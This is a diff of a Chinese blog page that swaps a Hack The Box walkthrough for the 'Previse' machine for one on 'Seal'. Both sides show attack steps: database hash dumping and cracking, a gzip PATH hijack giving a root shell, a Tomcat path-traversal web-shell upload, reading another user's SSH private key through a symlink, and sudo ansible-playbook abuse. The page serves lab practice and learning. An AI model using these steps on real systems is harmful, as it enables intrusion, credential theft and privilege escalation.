@@ -18,7 +18,7 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-  <title>Previse - Crush&#39;s Blog</title>
+  <title>Seal - Crush&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -175,7 +175,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Previse">
+            <span class="h2" id="subtitle" title="Seal">
               
             </span>
 
@@ -185,7 +185,7 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-10-18 14:54" pubdate>
+      <time datetime="2021-10-18 15:38" pubdate>
         2021年10月18日 下午
       </time>
     </span>
@@ -197,7 +197,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      710 字
+      422 字
     </span>
   
 
@@ -207,7 +207,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      10
+      6
        分钟
     </span>
   
@@ -237,100 +237,81 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Previse</h1>
+            <h1 style="display: none">Seal</h1>
             
             <div class="markdown-body">
-              <hr>
-<pre><code>参考wp：
-https://davidguest.uk/hack-the-box-previse/
-https://hackhouse.net/htb-previse/
-</code></pre>
-<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d1a942ab3f51d91a35671.jpg" srcset="/img/loading.gif" lazyload></h2><pre><code>老惯例，nmap 
-nmap -v -sSV -p 22,80 -Pn 10.10.11.104 -T4 -oA nmap/sSV 感觉免费的简单靶场都是22 和 80
-</code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d1aca2ab3f51d91a3898a.jpg" srcset="/img/loading.gif" lazyload><br>页面打开是这么个玩意儿<br><img src="https://pic.imgdb.cn/item/616d1aee2ab3f51d91a3aeed.jpg" srcset="/img/loading.gif" lazyload><br>目录扫描没扫出什么东西<br>使用 curl 时，可以从 webapp 获取真正的响应页面，因为 curl 默认不遵循重定向。</p>
+              <p>中等难度，且评分4.8很棒的靶场</p>
 <hr>
-<pre><code>curl -is -X GET 10.10.11.104/index.php
-</code></pre>
-<p>访问一下10.10.11.104/accounts.php </p>
-<hr>
-<pre><code>curl -is -X http://10.10.11.104/account.php
-</code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d1af42ab3f51d91a3b3ce.jpg" srcset="/img/loading.gif" lazyload><br>发现了3个表单，提交数据 并且说了用户名和密码在5-32个字符之间<br><img src="https://pic.imgdb.cn/item/616d1af72ab3f51d91a3b79b.jpg" srcset="/img/loading.gif" lazyload><br>-d POST 发送有参数的 POST 请求<br>用curl提交post请求访问一下 </p>
-<hr>
-<pre><code>curl -is -X POST -d &quot;username=hacker&amp;password=hacker&amp;confirm=hacker&quot; 10.10.11.104/accounts.php  
-</code></pre>
-<p>成功登陆。<br><img src="https://pic.imgdb.cn/item/616d1afc2ab3f51d91a3bcde.jpg" srcset="/img/loading.gif" lazyload><br>开始翻网站，翻到一个像是被注入过的一个日志文件<br><img src="https://pic.imgdb.cn/item/616d1b002ab3f51d91a3c109.jpg" srcset="/img/loading.gif" lazyload><br>file目录下有一个上传和一个上传文件的下载 backup，备份，网站备份文件，打开，干他 看备份文件就看config，db，这类的<br><img src="https://pic.imgdb.cn/item/616d1b062ab3f51d91a3c643.jpg" srcset="/img/loading.gif" lazyload><br>解压文件 unzip siteBackup.zip<br><img src="https://pic.imgdb.cn/item/616d1b092ab3f51d91a3c8e1.jpg" srcset="/img/loading.gif" lazyload><br>config.php  是一个数据库配置文件，可以尝试连一下ssh<br><img src="https://pic.imgdb.cn/item/616d1b0d2ab3f51d91a3ccc8.jpg" srcset="/img/loading.gif" lazyload><br>没啥用，继续翻文件logs.php 看到一个exec命令执行的函数<br><img src="https://pic.imgdb.cn/item/616d1b0f2ab3f51d91a3cf92.jpg" srcset="/img/loading.gif" lazyload><br>&amp;&amp; 连接一个反弹shell的命令<br><img src="https://pic.imgdb.cn/item/616d1b122ab3f51d91a3d22e.jpg" srcset="/img/loading.gif" lazyload><br><img src="https://pic.imgdb.cn/item/616d1b172ab3f51d91a3d6af.jpg" srcset="/img/loading.gif" lazyload><br><img src="https://pic.imgdb.cn/item/616d1b1a2ab3f51d91a3d96d.jpg" srcset="/img/loading.gif" lazyload><br>连接成功，是个低权限的 ls 没有要找到的user root flag<br>但是/home/下有一个用户m4lwhere，下面有一个user.txt，需要m4lwhere权限才能访问<br>前面拿到数据库配置的文件，看能不能再数据库里面找到m4lwhere的hash 用hashcat 爆一下<br>构造脚本</p>
-<hr>
-<pre><code>&lt;?php
-$db = connectDB();
-
-$query = &quot;SELECT username, password FROM accounts&quot;;
-$users = $db-&gt;query($query);
-
-if ($users-&gt;num_rows &gt; 0) &#123;
-    while($row = mysqli_fetch_assoc($users)) &#123;
-      var_dump($row);
-    &#125;
-  &#125;
-
-$db-&gt;close();
+<pre><code>nmap -sS -T5 10.10.10.250  
+PORT     STATE SERVICE 
+22/tcp   open  
+ssh 443/tcp  open  https 
+8080/tcp open  http-proxy
 </code></pre>
 <hr>
-<pre><code>echo &#39;&lt;上面的代码&gt;&#39; &gt;&gt; status.php里
+<pre><code>访问一个8080端口，提示注册用户，注册一个常试登录一下 
+hacker hacker
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/616d2fae2ab3f51d91b86a4d.jpg" srcset="/img/loading.gif" lazyload><br><img src="https://pic.imgdb.cn/item/616d2fb12ab3f51d91b86d66.jpg" srcset="/img/loading.gif" lazyload><br><img src="https://pic.imgdb.cn/item/616d2fb42ab3f51d91b86f6c.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>updating tomcat configuration  点了之后给了tomcat的帐密</p>
+<hr>
+<pre><code>&lt;user username=&quot;tomcat&quot; password=&quot;42MrHBf*z8&#123;Z%&quot; roles=&quot;manager-gui,admin-gui&quot;/&gt;
+</code></pre>
+<p>访问tomcat默认登录目录，用刚才的账号密码登录，登录成功<br><img src="https://pic.imgdb.cn/item/616d2fb82ab3f51d91b8733d.jpg" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<pre><code>https://seal.htb/manager/status/..;/html   上面有个上传
+</code></pre>
+<p>需要在上传的路径上修改 </p>
+<hr>
+<pre><code>POST /manager/satus/..;/html/upload?
+</code></pre>
+<p>200上传成功，访问木马</p>
+<hr>
+<pre><code>seal.htb/ma/ 
+nc -nvlp 4444 
+反弹成功
 </code></pre>
 <hr>
-<pre><code>curl 10.10.11.104/status.php  访问那个文件，成功读到了他的hash
+<pre><code>cd home/luis  
+发现user.txt访问不了，需要提权。   
+.ssh也没有访问权限
 </code></pre>
-<h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d1b1f2ab3f51d91a3ddcf.jpg" srcset="/img/loading.gif" lazyload></h2><pre><code>m4lwhere的hash就是
-$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
+<p>尝试创建一个指向luis的id_rsa的链接，我们可以把它放到/uploads目录中  </p>
+<hr>
+<pre><code>cd /opt/backups/archives  
+ln -s ~/home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa  
+cp 新出现的backup+日期的文件 
+/dev/shm  
+cd /dev/shm  mv backup-2021-07-26-14:20:32.gz backup.tar.gz  tar -xvf backup.tar.gz  cd /dashboard/uploads  cat id_rsa  
+kali 本机创建一个 luis-id_rsa文件复制id_rsa里面的内容 
+ssh -i lis-id_rsa luis@10.10.10.250 连接成功，找到第一个user.txt
 </code></pre>
 <hr>
-<pre><code>用john 或者 hashcat跑hash明文
+<pre><code>sudo -l /usr/bin/ansible-playbook 
 </code></pre>
 <hr>
-<pre><code>john
-john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long
+<pre><code>google找到这个玩意儿，应该是用来编写网页的是一个东西吧，但是可以用来执行命令， 
+https://docs.ansible.com/ansible/latest/user_guide/playbooks.html
 </code></pre>
-<h2 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d1b242ab3f51d91a3e262.jpg" srcset="/img/loading.gif" lazyload></h2><pre><code>hashcat
-hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 500
-</code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d1b272ab3f51d91a3e54e.jpg" srcset="/img/loading.gif" lazyload><br>ssh连接拿到第一个user.txt<br><img src="https://pic.imgdb.cn/item/616d1b272ab3f51d91a3e54e.jpg" srcset="/img/loading.gif" lazyload></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><hr>
-<pre><code>sudo -l  看到一个access_backup.sh的root文件
+<p>创建一个yml文件</p>
+<hr>
+<pre><code>创建一个yml文件
+- name: Ansible Copy Example Local to Remote
+  hosts: localhost
+  tasks:
+    - name: copying file with playbook
+      become: true 
+      copy:
+        src: /root/root.txt
+        dest: /dev/shm
+        owner: luis
+        group: luis        
+        mode: 0777
 </code></pre>
 <hr>
-<pre><code>m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
-#!/bin/bash
-
-# We always make sure to store logs, we take security SERIOUSLY here
-
-# I know I shouldnt run this as root but I cant figure it out programmatically on my account
-# This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time
-
-gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_access.gz
-gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_file_access.gz
+<pre><code>sudo -u root /usr/bin/ansible-playbook root.yml 
 </code></pre>
-<hr>
-<pre><code>cd /tmp
-cat &lt;&lt; EOF &gt; gzip
-&gt; #!/bin/bash
-&gt; cp /bin/bash /tmp/c
-&gt; chmod u+s /tmp/c
-&gt; EOF
-chmod +x gzip
-export PATH=$( pwd ):$PATH
-
-sudo /opt/scripts/access_backup.sh
-./c -p
-</code></pre>
-<hr>
-<pre><code>提权不是很懂，这个有点像是环境变量劫持，成功提权
-</code></pre>
-<hr>
-<pre><code>514371f6578495a1ae9624f3a199f944
-</code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d1b302ab3f51d91a3ed10.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>访问/dev/shm/root.txt就成功了。<br><img src="https://pic.imgdb.cn/item/616d2fc22ab3f51d91b87a81.jpg" srcset="/img/loading.gif" lazyload></p>
 
             </div>
             <hr>
@@ -365,9 +346,9 @@ sudo /opt/scripts/access_backup.sh
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/10/18/Horizontall/">
+                      <a href="/2021/10/18/Hach%20The%20Box-Write/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Horizontall</span>
+                        <span class="hidden-mobile">Write</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -375,8 +356,8 @@ sudo /opt/scripts/access_backup.sh
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/10/18/BountyHunter/">
-                        <span class="hidden-mobile">BountyHunter</span>
+                      <a href="/2021/10/18/Hach%20The%20Box-Driver/">
+                        <span class="hidden-mobile">Driver</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
